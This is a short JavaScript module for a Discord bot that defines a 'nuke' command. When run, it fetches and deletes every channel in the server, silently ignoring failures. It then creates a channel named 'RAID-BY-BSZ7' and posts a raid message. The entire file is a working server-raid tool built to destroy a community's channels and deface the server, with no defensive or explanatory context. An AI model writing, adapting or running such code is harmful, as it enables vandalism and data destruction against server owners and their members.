module.exports = {
  name: 'nuke',
  async execute(message, args, client) {
    const guild = message.guild;

    try {
      const channels = await guild.channels.fetch();
      for (const channel of channels.values()) {
        await channel.delete().catch(() => {});
      }

      const newChannel = await guild.channels.create({
        name: 'RAID-BY-BSZ7',
        type: 0,
      });

      await newChannel.send('💥 **RAID BY BSZ7**');
    } catch (err) {
      console.error(err);
    }
  },
};
